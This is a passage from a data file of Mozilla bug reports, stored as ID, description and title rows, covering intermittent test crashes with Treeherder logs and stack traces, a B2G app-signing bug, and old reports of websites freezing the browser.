TestScreenCaptureContent.test_capture_viewport | application crashed [@ libdvm.so + 0x26eec] [task 2018-04-07T23:42:00.759Z] 23:42:00     INFO -  Crash dump filename: /tmp/tmpruQ9dw/07f9f7da-9c89-9267-dccf-b37725996722.dmp,Intermittent testing/marionette/harness/marionette_harness/tests/unit/test_screenshot.py TestScreenCaptureContent.test_capture_viewport | application crashed [@ libdvm.so + 0x26eec]
11666,"Filed by: apavel [at] mozilla.com  https://treeherder.mozilla.org/logviewer.html#?job_id=192340828&repo=mozilla-inbound  https://queue.taskcluster.net/v1/task/W_pyCvtuSF2UyJ13pPkrsw/runs/0/artifacts/public/logs/live_backing.log  https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://queue.taskcluster.net/v1/task/W_pyCvtuSF2UyJ13pPkrsw/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1&only_show_unexpected=1  13:51:16     INFO - --DOMWINDOW == 3 (0x102a5e400) [pid = 2300] [serial = 1] [outer = 0x0] [url = chrome://browser/content/hiddenWindow.xul] 13:51:16     INFO - --DOMWINDOW == 2 (0x118cd2800) [pid = 2300] [serial = 2] [outer = 0x0] [url = about:blank] 13:51:16     INFO - --DOMWINDOW == 1 (0x118cd2400) [pid = 2300] [serial = 9] [outer = 0x0] [url = chrome://extensions/content/dummy.xul] 13:51:16     INFO - --DOCSHELL 0x117cdc800 == 0 [pid = 2300] [id = {31b3deb8-98b4-dd43-bd12-fbb1a86e69c6}] 13:51:16     INFO - --DOMWINDOW == 0 (0x115567800) [pid = 2300] [serial = 3] [outer = 0x0] [url = chrome://browser/content/browser.xul] 13:51:16     INFO - nsStringStats 13:51:16     INFO -  => mAllocCount:          56718 13:51:16     INFO -  => mReallocCount:         5084 13:51:16     INFO -  => mFreeCount:           56718 13:51:16     INFO -  => mShareCount:          64365 13:51:16     INFO -  => mAdoptCount:           2759 13:51:16     INFO -  => mAdoptFreeCount:       2867 13:51:16     INFO -  => Process ID: 2300, Thread ID: 140735236850432 13:51:16     INFO - Assertion failure: 0 == rv, at /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:833 13:51:16     INFO - Redirecting call to abort() to mozalloc_abort 13:51:16     INFO - Hit MOZ_CRASH() at /builds/worker/workspace/build/src/memory/mozalloc/mozalloc_abort.cpp:34 13:51:17    ERROR - TEST-UNEXPECTED-FAIL | file:///Users/cltbld/tasks/task_1533587203/build/tests/reftest/tests/layout/reftests/w3c-css/submitted/will-change/will-change-fixpos-cb-transform-style-1.html | application terminated with exit code -11 13:51:17     INFO - REFTEST INFO | Process mode: e10s 13:51:17  WARNING - leakcheck | refcount logging is off, so leaks can't be detected! 13:51:17     INFO - REFTEST INFO | Running tests in file:///Users/cltbld/tasks/task_1533587203/build/tests/reftest/tests/layout/reftests/forms/output/reftest.list 13:51:17     INFO - REFTEST INFO | Running with e10s: True 13:51:17     INFO - REFTEST INFO | Application command: /Users/cltbld/tasks/task_1533587203/build/application/Firefox NightlyDebug.app/Contents/MacOS/firefox -marionette -foreground -profile /var/folders/bb/0nmcwq6x05l5xlghtqb958d800000w/T/tmprVnbyT.mozrunner 13:51:18     INFO - ### XPCOM_MEM_BLOAT_LOG defined -- logging bloat/leaks to /var/folders/bb/0nmcwq6x05l5xlghtqb958d800000w/T/tmprVnbyT.mozrunner/runreftest_leaks.log 13:51:19     INFO - 1533588679500	Marionette	DEBUG	Received observer notification profile-after-change 13:51:19     INFO - 1533588679596	Marionette	DEBUG	Received observer notification command-line-startup 13:51:19     INFO - 1533588679597	Marionette	DEBUG	Received observer notification nsPref:changed 13:51:19     INFO - 1533588679597	Marionette	DEBUG	Init aborted (running=false, enabled=true, finalUIStartup=false) 13:51:19     INFO - ++DOCSHELL 0x11c609000 == 1 [pid = 2308] [id = {de21630d-23ea-5543-8d48-8f0a7deeef5b}] 13:51:19     INFO - ++DOMWINDOW == 1 (0x10975e400) [pid = 2308] [serial = 1] [outer = 0x0] 13:51:19     INFO - ++DOMWINDOW == 2 (0x11f39c800) [pid = 2308] [serial = 2] [outer = 0x10975e400] 13:51:19     INFO - [2308, Main Thread] WARNING: NS_ENSURE_SUCCESS(rv, rv) failed with result 0x80040111: file /builds/worker/workspace/build/src/netwerk/protocol/res/SubstitutingProtocolHandler.cpp, line 342","Intermittent Assertion failure: 0 == rv, at /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:833"
11712,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=257363921&repo=mozilla-central **Full log:** https://queue.taskcluster.net/v1/task/LU9FOQUtRWWjNqT-RH84aw/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://queue.taskcluster.net/v1/task/LU9FOQUtRWWjNqT-RH84aw/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1  ---  11:27:17     INFO - REFTEST TEST-START | file:///Z:/task_1563531811/build/tests/jsreftest/tests/jsreftest.html?test=test262/built-ins/Object/freeze/15.2.3.9-2-d-5.js 11:27:17     INFO - REFTEST TEST-LOAD | file:///Z:/task_1563531811/build/tests/jsreftest/tests/jsreftest.html?test=test262/built-ins/Object/freeze/15.2.3.9-2-d-5.js | 11771 / 17733 (66%) 11:27:20     INFO - out of memory: 0x0000000000010000 bytes requested 11:27:21    ERROR - A content process crashed and MOZ_CRASHREPORTER_SHUTDOWN is set, shutting down 11:27:21     INFO - [Parent 3064, Gecko_IOThread] WARNING: pipe error: 109: file z:/build/build/src/ipc/chromium/src/chrome/common/ipc_channel_win.cc, line 341 11:27:21     INFO - [Child 2684, Chrome_ChildThread] WARNING: pipe error: 109: file z:/build/build/src/ipc/chromium/src/chrome/common/ipc_channel_win.cc, line 341 11:27:21     INFO - [Child 2684, Chrome_ChildThread] WARNING: pipe error: 109: file z:/build/build/src/ipc/chromium/src/chrome/common/ipc_channel_win.cc, line 341 11:27:21     INFO - !!! error running onStopped callback: TypeError: callback is not a function 11:27:21     INFO - [Parent 3064, Gecko_IOThread] WARNING: pipe error: 109: file z:/build/build/src/ipc/chromium/src/chrome/common/ipc_channel_win.cc, line 341 11:27:21     INFO - [Child 2728, Chrome_ChildThread] WARNING: pipe error: 109: file z:/build/build/src/ipc/chromium/src/chrome/common/ipc_channel_win.cc, line 341 11:27:21     INFO - [[Parent 3064, Gecko_IOThread] WARNING: pipe error: 109: file z:/build/build/src/ipc/chromium/src/chrome/common/ipc_channel_win.cc, line 341 11:27:21     INFO - 1563535641431	Marionette	TRACE	Received observer notification xpcom-will-shutdown 11:27:21     INFO - 1563535641431	Marionette	INFO	Stopped listening on port 2828 11:27:21     INFO - 1563535641431	Marionette	DEBUG	Remote service is inactive 11:27:21     INFO - REFTEST INFO | Downloading symbols from: https://queue.taskcluster.net/v1/task/O94nXqqBTn-FhSKkVqckPg/artifacts/public/build/target.crashreporter-symbols.zip 11:27:26     INFO - REFTEST INFO | Copy/paste: Z:\task_1563531811\build\win32-minidump_stackwalk.exe c:\users\task_1563531811\appdata\local\temp\tmpdyznfj.mozrunner\minidumps\0f5f2fba-f222-4e1c-ba87-2f607d338d4b.dmp c:\users\task_1563531811\appdata\local\temp\tmpwpjssj 11:27:38     INFO - REFTEST INFO | Saved minidump as Z:\task_1563531811\build\blobber_upload_dir\0f5f2fba-f222-4e1c-ba87-2f607d338d4b.dmp 11:27:38     INFO - REFTEST INFO | Saved app info as Z:\task_1563531811\build\blobber_upload_dir\0f5f2fba-f222-4e1c-ba87-2f607d338d4b.extra 11:27:39     INFO - REFTEST PROCESS-CRASH | file:///Z:/task_1563531811/build/tests/jsreftest/tests/jsreftest.html?test=test262/built-ins/Object/freeze/15.2.3.9-2-d-5.js | application crashed [@ mozalloc_handle_oom(unsigned int)] 11:27:39     INFO - Crash dump filename: c:\users\task_1563531811\appdata\local\temp\tmpdyznfj.mozrunner\minidumps\0f5f2fba-f222-4e1c-ba87-2f607d338d4b.dmp 11:27:39     INFO - Operating system: Windows NT 11:27:39     INFO -                   6.1.7601 Service Pack 1 11:27:39     INFO - CPU: x86 11:27:39     INFO -      GenuineIntel family 6 model 63 stepping 2 11:27:39     INFO -      8 CPUs 11:27:39     INFO -  11:27:39     INFO - GPU: UNKNOWN 11:27:39     INFO -  11:27:39     INFO - Crash reason:  EXCEPTION_BREAKPOINT 11:27:39     INFO - Crash address: 0x71238d3c 11:27:39     INFO - Assertion: Unknown assertion type 0x00000000 11:27:39     INFO - Process uptime: 659 seconds 11:27:39     INFO -  11:27:39     INFO - Thread 0 (crashed) 11:27:39     INFO -  0  mozglue.dll!mozalloc_abort [mozalloc_abort.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 33 + 0x0] 11:27:39     INFO -     eip = 0x71238d3c   esp = 0x001ad298   ebp = 0x001ad2a0   ebx = 0x570eb040 11:27:39     INFO -     esi = 0x001ad2ae   edi = 0x6aa6f9b0   eax = 0x0000000a   ecx = 0x6aa77af0 11:27:39     INFO -     edx = 0x00000000   efl = 0x00000202 11:27:39     INFO -     Found by: given as instruction pointer in context 11:27:39     INFO -  1  mozglue.dll!mozalloc_handle_oom(unsigned int) [mozalloc_oom.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 51 + 0x6] 11:27:39     INFO -     eip = 0x71238ea3   esp = 0x001ad2a8   ebp = 0x001ad2e8   esi = 0x001ad2ae 11:27:39     INFO -     edi = 0x00000000 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  2  mozglue.dll!moz_xmalloc [mozalloc.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 54 + 0x6] 11:27:39     INFO -     eip = 0x71238e31   esp = 0x001ad2f0   ebp = 0x001ad2f8   esi = 0x00010000 11:27:39     INFO -     edi = 0x6d13fa08 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  3  xul.dll!CCGraphBuilder::NoteJSChild(JS::GCCellPtr const &) [nsCycleCollector.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 2206 + 0x29] 11:27:39     INFO -     eip = 0x59910d5b   esp = 0x001ad300   ebp = 0x001ad324   esi = 0x0ba23000 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  4  xul.dll!TraversalTracer::onChild(JS::GCCellPtr const &) [CycleCollectedJSRuntime.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 420 + 0x7] 11:27:39     INFO -     eip = 0x599015b9   esp = 0x001ad32c   ebp = 0x001ad40c   ebx = 0x001ad468 11:27:39     INFO -     esi = 0x001ad638   edi = 0x001ad418 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  5  xul.dll!JS::CallbackTracer::onObjectEdge(JSObject * *) [TracingAPI.h:dc32c9061a0a335dd582845703cd742c55be9c85 : 157 + 0x6] 11:27:39     INFO -     eip = 0x5990a8c2   esp = 0x001ad414   ebp = 0x001ad420   ebx = 0x001ad468 11:27:39     INFO -     esi = 0x001ad638   edi = 0x5ddd8f81 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  6  xul.dll!DoCallback<JSObject>(JS::CallbackTracer *,JSObject * *,char const *) [Tracer.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 45 + 0x5] 11:27:39     INFO -     eip = 0x5cb68f2f   esp = 0x001ad428   ebp = 0x001ad438 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  7  xul.dll!js::gc::TraceEdgeInternal<JSObject *>(JSTracer *,JSObject * *,char const *) [Marking.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 590 + 0xa] 11:27:39     INFO -     eip = 0x5cb4cbb1   esp = 0x001ad440   ebp = 0x001ad450   ebx = 0x570f60c0 11:27:39     INFO -     esi = 0x001ad468   edi = 0x001ad63c 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  8  xul.dll!js::ObjectGroup::traceChildren(JSTracer *) [Marking.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 1369 + 0xf] 11:27:39     INFO -     eip = 0x5cb48182   esp = 0x001ad458   ebp = 0x001ad480   esi = 0x570e8100 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO -  9  xul.dll!js::gc::TraceCycleCollectorChildren(JS::CallbackTracer *,js::ObjectGroup *) [Tracer.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 164 + 0xe] 11:27:39     INFO -     eip = 0x5cb68f57   esp = 0x001ad488   ebp = 0x001ad48c   ebx = 0x570f60c0 11:27:39     INFO -     esi = 0x001ad638   edi = 0x001ad590 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 10  xul.dll!JS_TraceObjectGroupCycleCollectorChildren(JS::CallbackTracer *,JS::GCCellPtr) [jsfriendapi.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 209 + 0x9] 11:27:39     INFO -     eip = 0x5caeac52   esp = 0x001ad494   ebp = 0x001ad49c 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 11  xul.dll!TraversalTracer::onChild(JS::GCCellPtr const &) [CycleCollectedJSRuntime.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 429 + 0x7] 11:27:39     INFO -     eip = 0x59901612   esp = 0x001ad4a4   ebp = 0x001ad584 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 12  xul.dll!JS::CallbackTracer::onObjectGroupEdge(js::ObjectGroup * *) [TracingAPI.h:dc32c9061a0a335dd582845703cd742c55be9c85 : 170 + 0x6] 11:27:39     INFO -     eip = 0x5990aa45   esp = 0x001ad58c   ebp = 0x001ad598   ebx = 0x570f60c0 11:27:39     INFO -     esi = 0x001ad638   edi = 0x00000000 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 13  xul.dll!DoCallback<js::ObjectGroup>(JS::CallbackTracer *,js::ObjectGroup * *,char const *) [Tracer.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 45 + 0x6] 11:27:39     INFO -     eip = 0x5cb69410   esp = 0x001ad5a0   ebp = 0x001ad5b0 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 14  xul.dll!js::gc::TraceEdgeInternal<js::ObjectGroup *>(JSTracer *,js::ObjectGroup * *,char const *) [Marking.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 590 + 0xa] 11:27:39     INFO -     eip = 0x5cb4cc9a   esp = 0x001ad5b8   ebp = 0x001ad5c4   ebx = 0x001ad63c 11:27:39     INFO -     esi = 0x001ad63c   edi = 0x570f60c0 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 15  xul.dll!JSObject::traceChildren(JSTracer *) [JSObject.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 4060 + 0xc] 11:27:39     INFO -     eip = 0x5c98c4d4   esp = 0x001ad5cc   ebp = 0x001ad600 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 16  xul.dll!js::TraceChildren(JSTracer *,void *,JS::TraceKind) [Tracer.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 95 + 0x18] 11:27:39     INFO -     eip = 0x5cb6848e   esp = 0x001ad608   ebp = 0x001ad60c   ebx = 0x22222201 11:27:39     INFO -     esi = 0x001ad63c   edi = 0x0ba23000 11:27:39     INFO -     Found by: call frame info 11:27:39     INFO - 17  xul.dll!JS::TraceChildren(JSTracer *,JS::GCCellPtr) [Tracer.cpp:dc32c9061a0a335dd582845703cd742c55be9c85 : 90 + 0x8] 11:27:39     INFO -     eip = 0x5cb68455   esp = 0x001ad614   ebp = 0x001ad628 11:27:39     INFO -     Found by: call frame info",Intermittent file:///Z:/task_1563531811/build/tests/jsreftest/tests/jsreftest.html?test=test262/built-ins/Object/freeze/15.2.3.9-2-d-5.js | application crashed [@ mozalloc_handle_oom(unsigned int)]
11727,Build: B2G 18 12/20/2012 Device: Unagi  Steps:  1. Install https://marketplace-dev.allizom.org/app/new-privileged-app 2. Run adb shell cat /data/local/webapps/webapps.json on your device and find the app you just installed  Expected:  The appStatus should be privileged.  Actual:  The appStatus ends up being web. This implies that signing failed somewhere.,"Installing a privileged app from marketplace dev - appStatus should be privileged, but ends up being web"
11742,From Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; Linux 2.4.2-2 i686; en-US; rv:0.9.1) Gecko/20010607 BuildID:    2001060713 (Mozilla 0.9.1)  http://www.dualathlon.com/ locks mozilla at 0% CPU. The windows refuse to redraw.   Reproducible: Always Steps to Reproduce: 1. Load http://www.dualathlon.com/ 2. 3.  Actual Results:  Mozilla crashed.   Expected Results:  Displayed the page.,Site locks mozilla hard on loading
11816,From Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.8) Gecko/20020212 BuildID:    Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.8) Gecko/20020212  CPU utilization pegs when browsing the URL.  Does not recover within 5 minutes.  Effect is application freeze.  Reproducible: Always Steps to Reproduce: 1.Just visit the specified URL 2. 3.  Actual Results:  Mozilla becomes non-responsive  Expected Results:  rendered page,URL consistently freezes mozilla
11854,"User-Agent:       Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2b) Gecko/20021016 Build Identifier: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2b) Gecko/20021016  Mac OS X 10.2.1, build 6D52  PowerMac Dual G4 500, 1Gig ram  Mozilla 1.2b  Reproducible: Didn't try  Steps to Reproduce: 1. goto http://www.cadencepcb.com/products/downloads/partbrowser/frmpartbrowser.asp      Oct 17 18:29:32 localhost /sbin/autodiskmount[529]: disk6      hfs      no    no    Mozilla for MacOS X [not mounted]      Oct 17 18:29:32 localhost /sbin/autodiskmount[529]: disk6      hfs      no    no    Mozilla for MacOS X /Volumes/Mozilla for MacOS X   Oct 17 18:31:19 localhost /Volumes/:Users:.A4/Xtra Applications/Mozilla/Mozilla.app/Contents/MacOS/Mozilla: *** Warning: ATSUMeasureText has been deprecated.  Use ATSUGetUnjustifiedBounds instead. ***   Oct 17 23:09:40 localhost /Volumes/:Users:.A4/Xtra Applications/Microsoft Office X/Microsoft Excel: *** Warning: ATSUMeasureText has been deprecated.  Use ATSUGetUnjustifiedBounds instead. ***   Oct 17 23:09:40 localhost WindowServer[224]: orderWindow: Invalid other window  Oct 17 23:09:40 localhost WindowServer[224]: orderWindow: Invalid other window  Oct 18 00:47:12 localhost WindowServer[224]: CGXOrderWindow: Invalid window 0  Oct 18 01:36:22 localhost crashdump: Crash report written to: /Volumes/:Users:.A4/Users/dgodfrey/Library/Logs/CrashReporter/Mozilla.crash.log  **********  Date/Time:  2002-10-18 01:36:22 -0400 OS Version: 10.2.1 (Build 6D52) Host:       localhost  Command:    Mozilla PID:        14111  Exception:  EXC_BAD_ACCESS (0x0001) Codes:      KERN_PROTECTION_FAILURE (0x0002) at 0x00000034  Thread 0:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x9283ddf4 in JVM_NewInstance  #3   0x9285eb40 in JVM_FillInStackTrace  #4   0x92868468 in JVM_DoPrivileged  #5   0x928e2df4 in JVM_GC  #6   0x928e787c in JVM_TotalMemory  #7   0x92867a08 in JVM_DoPrivileged  #8   0x92857bc8 in JVM_GetMethodIxLocalsCount  #9   0x928a21f8 in JVM_Close  #10  0x940b1780 in LockAcquire  #11  0x8cfd303c in InitJavaEmbedding(JNIEnv_*&)  #12  0x8cfd57d4 in CreateJavaApplet  #13  0x0334f6e4 in MRJContext::loadApplet(void)  #14  0x03350208 in MRJContext::setWindow(nsPluginWindow *)  #15  0x0334be54 in MRJPluginInstance::SetWindow(nsPluginWindow *)  #16  0x032dd428 in InstantiateEmbededPlugin__16nsPluginHostImplFPCcP6nsIURIP22nsI  #17  0x0363c8bc in InstantiatePlugin__13nsObjectFrameFP14nsIPresContextR19nsHTMLR  #18  0x0363b650 in 0x363b650  #19  0x03672e44 in 0x3672e44  #20  0x0366bdf8 in 0x366bdf8  #21  0x0366bac8 in DoReflowInlineFrames__12nsBlockFrameFR18nsBlockReflowStateR12n  #22  0x0366b788 in nsBlockFrame::DoReflowInlineFramesAuto(nsBlockReflowState &)  #23  0x0366b508 in ReflowInlineFrames__12nsBlockFrameFR18nsBlockReflowState19nsLi  #24  0x036695c0 in ReflowLine__12nsBlockFrameFR18nsBlockReflowState19nsLineList_i  #25  0x03668c94 in 0x3668c94  #26  0x03666f54 in 0x3666f54  #27  0x0368f640 in ReflowBlock__20nsBlockReflowContextFRC6nsRectiR18nsCollapsingM  #28  0x0366ae40 in 0x366ae40  #29  0x036692fc in 0x36692fc  #30  0x03668c94 in 0x3668c94  #31  0x03666f54 in 0x3666f54  #32  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #33  0x0360fe30 in 0x360fe30  #34  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #35  0x0363124c in IR_TargetIsChild__15nsTableRowFrameFP14nsIPresContextR19nsHTML  #36  0x03630c64 in IncrementalReflow__15nsTableRowFrameFP14nsIPresContextR19nsHTM  #37  0x0363176c in Reflow__15nsTableRowFrameFP14nsIPresContextR19nsHTMLReflowMetr  #38  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #39  0x03636cd8 in IR_TargetIsChild__20nsTableRowGroupFrameFP14nsIPresContextR19n  #40  0x03635bb8 in IncrementalReflow__20nsTableRowGroupFrameFP14nsIPresContextR19  #41  0x036357c4 in Reflow__20nsTableRowGroupFrameFP14nsIPresContextR19nsHTMLReflo  #42  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #43  0x0361c264 in IR_TargetIsChild__12nsTableFrameFP14nsIPresContextR18nsTableRe  #44  0x0361af34 in IncrementalReflow__12nsTableFrameFP14nsIPresContextRC17nsHTMLR  #45  0x0361917c in 0x361917c  #46  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #47  0x0362b340 in OuterReflowChild__17nsTableOuterFrameFP14nsIPresContextP8nsIFr  #48  0x0362c3ac in IR_InnerTableReflow__  #49  0x0362b8e8 in IR_TargetIsInnerTableFrame__17nsTableOuterFrameFP14nsIPresCont  #50  0x0362b794 in IR_TargetIsChild__17nsTableOuterFrameFP14nsIPresContextR19nsHT  #51  0x0362b678 in IncrementalReflow__17nsTableOuterFrameFP14nsIPresContextR19nsH  #52  0x0362cf08 in 0x362cf08  #53  0x0368f68c in ReflowBlock__20nsBlockReflowContextFRC6nsRectiR18nsCollapsingM  #54  0x0366ae40 in 0x366ae40  #55  0x036692fc in 0x36692fc  #56  0x03668c94 in 0x3668c94  #57  0x03666f54 in 0x3666f54  #58  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #59  0x0360fe30 in 0x360fe30  #60  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #61  0x0363124c in IR_TargetIsChild__15nsTableRowFrameFP14nsIPresContextR19nsHTML  #62  0x03630c64 in IncrementalReflow__15nsTableRowFrameFP14nsIPresContextR19nsHTM  #63  0x0363176c in Reflow__15nsTableRowFrameFP14nsIPresContextR19nsHTMLReflowMetr  #64  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #65  0x03636cd8 in IR_TargetIsChild__20nsTableRowGroupFrameFP14nsIPresContextR19n  #66  0x03635bb8 in IncrementalReflow__20nsTableRowGroupFrameFP14nsIPresContextR19  #67  0x036357c4 in Reflow__20nsTableRowGroupFrameFP14nsIPresContextR19nsHTMLReflo  #68  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #69  0x0361c264 in IR_TargetIsChild__12nsTableFrameFP14nsIPresContextR18nsTableRe  #70  0x0361af34 in IncrementalReflow__12nsTableFrameFP14nsIPresContextRC17nsHTMLR  #71  0x0361917c in 0x361917c  #72  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #73  0x0362b340 in OuterReflowChild__17nsTableOuterFrameFP14nsIPresContextP8nsIFr  #74  0x0362c3ac in IR_InnerTableReflow__  #75  0x0362b8e8 in IR_TargetIsInnerTableFrame__17nsTableOuterFrameFP14nsIPresCont  #76  0x0362b794 in IR_TargetIsChild__17nsTableOuterFrameFP14nsIPresContextR19nsHT  #77  0x0362b678 in IncrementalReflow__17nsTableOuterFrameFP14nsIPresContextR19nsH  #78  0x0362cf08 in 0x362cf08  #79  0x0368f68c in ReflowBlock__20nsBlockReflowContextFRC6nsRectiR18nsCollapsingM  #80  0x0366ae40 in 0x366ae40  #81  0x036692fc in 0x36692fc  #82  0x03668c94 in 0x3668c94  #83  0x03666f54 in 0x3666f54  #84  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #85  0x0360fe30 in 0x360fe30  #86  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #87  0x0363124c in IR_TargetIsChild__15nsTableRowFrameFP14nsIPresContextR19nsHTML  #88  0x03630c64 in IncrementalReflow__15nsTableRowFrameFP14nsIPresContextR19nsHTM  #89  0x0363176c in Reflow__15nsTableRowFrameFP14nsIPresContextR19nsHTMLReflowMetr  #90  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #91  0x03636cd8 in IR_TargetIsChild__20nsTableRowGroupFrameFP14nsIPresContextR19n  #92  0x03635bb8 in IncrementalReflow__20nsTableRowGroupFrameFP14nsIPresContextR19  #93  0x036357c4 in Reflow__20nsTableRowGroupFrameFP14nsIPresContextR19nsHTMLReflo  #94  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #95  0x0361c264 in IR_TargetIsChild__12nsTableFrameFP14nsIPresContextR18nsTableRe  #96  0x0361af34 in IncrementalReflow__12nsTableFrameFP14nsIPresContextRC17nsHTMLR  #97  0x0361917c in 0x361917c  #98  0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #99  0x0362b340 in OuterReflowChild__17nsTableOuterFrameFP14nsIPresContextP8nsIFr  #100 0x0362c3ac in IR_InnerTableReflow__  #101 0x0362b8e8 in IR_TargetIsInnerTableFrame__17nsTableOuterFrameFP14nsIPresCont  #102 0x0362b794 in IR_TargetIsChild__17nsTableOuterFrameFP14nsIPresContextR19nsHT  #103 0x0362b678 in IncrementalReflow__17nsTableOuterFrameFP14nsIPresContextR19nsH  #104 0x0362cf08 in 0x362cf08  #105 0x0368f68c in ReflowBlock__20nsBlockReflowContextFRC6nsRectiR18nsCollapsingM  #106 0x0366ae40 in 0x366ae40  #107 0x036692fc in 0x36692fc  #108 0x03668c94 in 0x3668c94  #109 0x03666f54 in 0x3666f54  #110 0x0368f68c in ReflowBlock__20nsBlockReflowContextFRC6nsRectiR18nsCollapsingM  #111 0x0366ae40 in 0x366ae40  #112 0x036692fc in 0x36692fc  #113 0x03668c94 in 0x3668c94  #114 0x03666f54 in 0x3666f54  #115 0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #116 0x03763684 in CanvasFrame::Reflow(nsIPresContext *, nsHTMLReflowMetrics &,  &)  #117 0x037217c0 in Reflow__19nsBoxToBlockAdaptorFR16nsBoxLayoutStateP14nsIPresCon  #118 0x037211ac in nsBoxToBlockAdaptor::DoLayout(nsBoxLayoutState &)  #119 0x0371bc1c in nsBox::Layout(nsBoxLayoutState &)  #120 0x0374ce1c in 0x374ce1c  #121 0x0371bc1c in nsBox::Layout(nsBoxLayoutState &)  #122 0x03724708 in LayoutChildAt__14nsContainerBoxFR16nsBoxLayoutStateP6nsIBoxRC6  #123 0x03710abc in nsGfxScrollFrameInner::LayoutBox(nsBoxLayoutState &, nsIBox *)  #124 0x03710f9c in 0x3710f9c  #125 0x03710b74 in nsGfxScrollFrame::DoLayout(nsBoxLayoutState &)  #126 0x0371bc1c in nsBox::Layout(nsBoxLayoutState &)  #127 0x036dccc4 in nsBoxFrame::Reflow(nsIPresContext *, nsHTMLReflowMetrics &,  const &)  #128 0x0370fa40 in Reflow__16nsGfxScrollFrameFP14nsIPresContextR19nsHTMLReflowMet  #129 0x035bee6c in ReflowChild__16nsContainerFrameFP8nsIFrameP14nsIPresContextR19  #130 0x036ac3f8 in Reflow__13ViewportFrameFP14nsIPresContextR19nsHTMLReflowMetric  #131 0x035d4848 in Dispatch__17IncrementalReflowFP14nsIPresContextR19nsHTMLReflow  #132 0x035e58ec in PresShell::ProcessReflowCommands(int)  #133 0x035e52a4 in HandlePLEvent(ReflowEvent *)  #134 0x002d3c70 in PL_HandleEvent  #135 0x002d3adc in PL_ProcessPendingEvents  #136 0x0027b67c in nsEventQueueImpl::ProcessPendingEvents(void)  #137 0x02d3de7c in nsMacNSPREventQueueHandler::ProcessPLEventQueue(void)  #138 0x02d3dd20 in nsMacNSPREventQueueHandler::RepeatAction(EventRecord const &)  #139 0x02c62b14 in Repeater::DoRepeaters(EventRecord const &)  #140 0x02d54678 in nsMacMessagePump::DispatchEvent(int, EventRecord *)  #141 0x02d543b0 in nsMacMessagePump::DoMessagePump(void)  #142 0x02d53cbc in nsAppShell::Run(void)  #143 0x02d1323c in nsAppShellService::Run(void)  #144 0x001a42c0 in main1(int, char **, nsISupports *)  #145 0x001a4d1c in main  Thread 1:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0xc00076cc in __ape_internal  #3   0xc0000dd0 in __ape_agent  #4   0x90021428 in _pthread_body  Thread 2:  #0   0x9000582c in syscall  #1   0x90515d9c in 